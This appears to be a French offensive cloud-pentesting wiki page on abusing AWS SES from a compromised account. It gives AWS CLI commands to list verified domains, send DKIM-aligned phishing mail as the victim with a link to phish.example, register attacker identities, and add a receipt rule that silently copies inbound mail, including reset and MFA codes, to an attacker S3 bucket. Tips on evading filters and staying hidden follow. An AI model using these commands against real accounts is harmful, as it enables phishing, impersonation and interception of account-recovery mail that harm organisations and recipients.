---
title: "SES : phishing et mail usurpé depuis un domaine de confiance"
description: "Abuser de SES pour envoyer du phishing et du mail usurpé depuis un domaine de confiance, et lire les identités vérifiées et les quotas d'envoi."
keywords:
  - SES
  - email
  - phishing
  - spoofing
  - verified identity
---

# SES

Simple Email Service envoie du mail depuis les **identités vérifiées** du compte, des domaines et des adresses qui passent déjà SPF, DKIM et DMARC parce que la victime les a configurés. Avec `ses:SendEmail` (ou `ses:SendRawEmail`), vous envoyez du mail cryptographiquement aligné avec un domaine de confiance, ce qui est une position de phishing bien plus solide que n'importe quel sosie que vous pourriez enregistrer, et vous héritez de la réputation d'expédition rodée du compte et de son quota.

## Trouver au nom de qui vous pouvez envoyer

```bash
aws ses list-identities --identity-type Domain        # verified domains
aws ses get-identity-verification-attributes --identities example.com
aws ses get-send-quota                                 # daily cap and send rate
aws sesv2 get-account                                  # sending enabled, reputation
```

Un domaine vérifié avec DKIM activé est le gros lot : le mail provenant de lui s'aligne pour DMARC.

## Envoyer en tant que victime

```bash
aws ses send-email \
  --from "it-support@example.com" \
  --destination "ToAddresses=target@example.com" \
  --message 'Subject={Data=Action required},Body={Html={Data=<a href=https://phish.example>reset</a>}}'

# raw MIME for full header control (display name, Reply-To, attachments)
aws ses send-raw-email --raw-message Data=fileb://phish.eml
```

## Vérifier votre propre identité

Si le compte peut vérifier des identités, ajoutez-en une que vous contrôlez pour élargir au nom de qui vous pouvez envoyer et pour amorcer un chemin de réponse :

```bash
aws ses verify-email-identity --email-address collect@you.example
aws ses verify-domain-identity --domain you.example     # returns a TXT token to publish
```

## Intercepter le mail entrant

Là où le domaine reçoit du mail via SES, une **receipt rule** classe les messages entrants vers une destination que vous contrôlez, ce qui transforme le compte en écoute de boîte aux lettres pour les réinitialisations de mot de passe et les mails MFA :

```bash
aws ses list-receipt-rule-sets ; aws ses describe-active-receipt-rule-set
# add a rule that copies inbound mail to an attacker S3 bucket (or Lambda/SNS)
aws ses create-receipt-rule --rule-set-name <active-set> \
  --rule 'Name=tap,Enabled=true,Recipients=[target@example.com],Actions=[{S3Action={BucketName=<attacker-bucket>}}]'
```

## Notes d'exploitation

- Le mail part depuis les IP d'expédition AWS avec un DKIM valide pour le domaine : il franchit donc les filtres qui bloquent les expéditeurs externes usurpés.
- Une receipt rule entrante est une interception durable : elle continue de capturer le mail (y compris les messages de récupération de compte et MFA) jusqu'à ce qu'un opérateur audite l'ensemble de règles.
- `ses:SendRawEmail` donne un contrôle MIME complet ; définissez un `Reply-To` plausible que vous possédez pour collecter les réponses.
- Si le compte est encore dans le sandbox SES, l'envoi est limité aux destinataires vérifiés ; vérifiez `get-account` et pivotez vers un compte en mode production s'il est en sandbox.
- Des politiques d'autorisation sur une identité (`ses:SendEmail` accordé en cross-account) peuvent permettre à un point d'appui dans un compte d'envoyer au nom du domaine d'un autre.

## Outils

- **AWS CLI** (`ses send-email` / `send-raw-email`) : l'envoi.
- **Pacu** (`ses__enum`) : énumérer les identités et l'état d'envoi.

## Références

- [HackTricks Cloud : abus de SES AWS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ses-enum.html)
- [AWS : API SES send-email](https://docs.aws.amazon.com/ses/latest/APIReference/API_SendEmail.html)
- [Rhino Security Labs : phishing avec Amazon SES](https://rhinosecuritylabs.com/aws/)
- [Hacking the Cloud : techniques offensives AWS](https://hackingthe.cloud/)
